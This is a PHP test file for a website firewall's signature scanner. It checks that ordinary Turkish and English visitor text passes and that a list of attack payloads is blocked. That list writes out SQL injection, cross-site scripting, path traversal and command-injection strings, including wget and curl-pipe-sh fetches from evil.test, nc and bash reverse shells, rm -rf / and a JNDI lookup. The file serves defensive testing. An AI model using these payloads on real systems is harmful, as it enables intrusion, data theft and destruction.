<?php
/**
 * Pinegrap - Enterprise Website Platform
 *
 * The signature scan against a corpus: what honest visitors type (Turkish and
 * English prose, product names, addresses, searches) must score under the
 * Medium threshold, real attack payloads at or over it. Each value is scanned
 * as a form field (BODY) and as a query parameter (ARGS) by waf_scan_value(),
 * the per-value half of waf_scan_request().
 *
 * @author      Erdal Güral (Kodpen)
 * @link        https://kodpen.com
 * @copyright   2017–2026 Kodpen
 * @license     https://opensource.org/licenses/mit-license.html MIT License
 */

if (!defined('PG_TEST_RUNNER')) {
	exit;
}

require_once(PG_FUNCTIONS_DIR . '/waf.php');

// Medium, the default sensitivity (waf_threshold()).
function waf_rules_corpus_test_threshold()
{
	return 10;
}

function waf_rules_corpus_test_scan($target, $value)
{
	$result = array('score' => 0, 'hits' => array());
	waf_scan_value($target, $value, $result);

	$ids = array();

	foreach ($result['hits'] as $hit) {
		$ids[] = $hit['id'] . ' "' . $hit['matched'] . '"';
	}

	return array($result['score'], implode(', ', $ids));
}

function waf_rules_corpus_test_honest()
{
	return array(
		// The sentences found refused on a live site.
		'Home Theater System (5.1) black',
		'Our heating system (installed 2019) needs service.',
		'Siparis no 5512; ID 99812 teslim edilmedi.',
		'Is makinesi ariyorum; CAT 320 ekskavator var mi?',
		'Building B; Rm 204',
		'Calle Mayor 5; CP 28013',
		'Lutfen beni arayin; ping atarsaniz sevinirim',
		'Evcil hayvanim var | cat ve kopek',
		'He said "great" and I like it.',
		'Rock "n" and Roll = hayat',
		'I sleep (badly) since the surgery.',
		'The union will select a new board next week.',
		'Fiyat 100 TL and 2 = 2 adet',
		'Web sitenizdeki <form> calismiyor',
		'the price is < base rate',
		'Onload = sayfa acilinca calisan olay degil mi?',
		'cmd.exe acilmiyor',
		'edwin.iniesta@gmail.com',
		'file://sunucu/paylasim/rapor.docx',
		'https://example.com/a/../../b.jpg',

		// More of the same kind.
		'Sipariş numaram 10234; kargo hâlâ gelmedi, yardımcı olur musunuz?',
		'Ürün açıklamasında "su geçirmez" yazıyor ama yağmurda ıslandı.',
		'Merhaba, 3 adet ürün aldım ve 1 tanesi kırık geldi.',
		'Atatürk Mah. 1203. Sok. No: 5/3 Çankaya / Ankara',
		'Kat: 2; Daire: 7 (zil çalışmıyor, lütfen arayın)',
		'Fatura adresi | teslimat adresi aynı',
		'Beden: M / L arası; renk: lacivert',
		'Samsung Galaxy S24 Ultra (512 GB) - Titanium Black',
		'USB-C to HDMI adapter (4K@60Hz) & charger',
		'Bosch Serie 6 washing machine; WAU28PH0TR',
		'O\'Brien\'s Pub -- best fish & chips',
		'Children (ages 3-6) select their own books from the shelf.',
		'Please call me back; my number is 0532 111 22 33',
		'Can you ship to 221B Baker Street, London NW1 6XE?',
		'I want to cancel my order and get a refund = full price?',
		'The meeting is at 10:00 or 11:00 - whichever suits you.',
		'Our system (Windows 11) cannot open the invoice PDF.',
		'Kedi maması | köpek maması | kuş yemi',
		'Rm 12; cp 5; ls 3 (stok kodları)',
		'Kampanya: 2 al 1 öde (sadece bugün)',
		'Union Jack t-shirt, select size below',
		'He wrote: "is it on sale" or "is it new"?',
		'Product sizes: S < M < L',
		'Tarifi: un, şeker ve süt = kek',
		'Her şey yolunda, sistem (yeni) güzel çalışıyor.',
		'smart TV system(s) on sale',
		'Mail me at ali.veli@example.com.tr; thanks!',
		'search: sleep mask',
		'iframe nedir',
		'Onerror ne demek?',
	);
}

function waf_rules_corpus_test_attacks()
{
	return array(
		// SQL injection
		"' or '1'='1",
		"' OR 1=1--",
		'" or ""="',
		"admin' or 'x' like 'x",
		"' or x=x--",
		'1 or 1=1',
		"1' and 1=1#",
		'1 UNION SELECT username, password FROM user',
		"' UNION ALL SELECT NULL,NULL--",
		'1 union/**/select 1,2,3',
		"1'union(select 1)",
		'1 AND SLEEP(5)',
		"1' AND IF(1=1,SLEEP(5),0)--",
		'1; SELECT pg_sleep(5)',
		"1'; WAITFOR DELAY '0:0:5'--",
		'1 and benchmark(5000000,md5(1))',
		'1 and sleep((select 5))',
		"'; DROP TABLE user--",
		'1 and extractvalue(1,concat(0x7e,version()))',
		'select * from information_schema.tables',

		// Cross-site scripting
		'<script>alert(1)</script>',
		'<img src=x onerror=alert(1)>',
		'" onmouseover="alert(1)',
		'<svg onload=alert(1)>',
		'<svg/onload=alert`1`>',
		'<body onload="window.location=\'https://evil.test\'">',
		'<a onclick=top[\'al\'+\'ert\'](1)>x</a>',
		'<x onfocus=&#97;lert(1) autofocus>',
		'<iframe src="https://evil.test"></iframe>',
		'<form action="https://evil.test/collect"><input name=p></form>',
		'<meta http-equiv="refresh" content="0;url=https://evil.test">',
		'<base href="https://evil.test/">',
		'<object data="https://evil.test/x.swf"></object>',
		'<embed src=https://evil.test/x.swf>',

		// Path traversal and file inclusion
		'../../etc/passwd',
		'../../../../config.php',
		'..\\..\\windows\\win.ini',
		'%2e%2e%2f%2e%2e%2fetc%2fpasswd',
		'c:\\windows\\system32\\cmd.exe',
		'C:/boot.ini',
		'cmd.exe /c dir',
		'php://filter/convert.base64-encode/resource=index.php',
		'php://input',
		'phar://uploads/x.jpg/shell',
		'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+',
		'file:///etc/passwd',
		'file://localhost/etc/passwd',
		'expect://id',
		'/proc/self/environ',

		// Command execution
		'; cat /etc/passwd',
		'| ls -la',
		'; wget http://evil.test/x.sh',
		'&& curl https://evil.test/x.sh | sh',
		'| nc 203.0.113.9 4444 -e /bin/sh',
		'; bash -i >& /dev/tcp/203.0.113.9/4444 0>&1',
		'; rm -rf /',
		'; ping -c 3 127.0.0.1',
		'; uname -a',
		"%0acat /etc/passwd",
		"system('id');",
		'system("ls -la");',
		'system($_GET[c]);',
		'shell_exec(\'whoami\')',
		'passthru(base64_decode($_POST[x]));',
		'system (\'id\')',
		'proc_open($cmd, $spec, $pipes)',
		"preg_replace('/.*/e', 'system(\"id\")', '')",
		'${jndi:ldap://evil.test/a}',
		'() { :; }; /bin/bash -c id',
	);
}

// What an honest visitor types stays under the threshold, as a form field
// and as a search parameter.
function test_waf_rules_corpus_honest_values_pass()
{
	foreach (waf_rules_corpus_test_honest() as $value) {
		foreach (array('BODY:message', 'ARGS:q') as $target) {
			list($score, $hits) = waf_rules_corpus_test_scan($target, $value);
			pg_assert_true($score < waf_rules_corpus_test_threshold(), $target . ' ' . $value . ' scored ' . $score . ': ' . $hits);
		}
	}
}

// A real attack payload still reaches the threshold in a query parameter,
// where every rule applies.
function test_waf_rules_corpus_attacks_are_refused()
{
	foreach (waf_rules_corpus_test_attacks() as $value) {
		list($score, $hits) = waf_rules_corpus_test_scan('ARGS:q', $value);
		pg_assert_true($score >= waf_rules_corpus_test_threshold(), 'ARGS:q ' . $value . ' scored ' . $score);
	}
}

// Thresholds and the scores of the rules stay as they were.
function test_waf_rules_corpus_scores_unchanged()
{
	$scores = array();

	foreach (waf_rules() as $rule) {
		$scores[$rule['id']] = $rule['score'];
	}

	foreach (array('sqli-union', 'sqli-tauto', 'sqli-numeq', 'sqli-timing', 'xss-handler', 'xss-tag', 'lfi-traverse', 'lfi-windows', 'lfi-wrapper', 'rce-shell', 'rce-php') as $id) {
		pg_assert_same(10, isset($scores[$id]) ? $scores[$id] : null, $id);
	}

	pg_assert_same(31, count($scores), 'no rule removed');
}
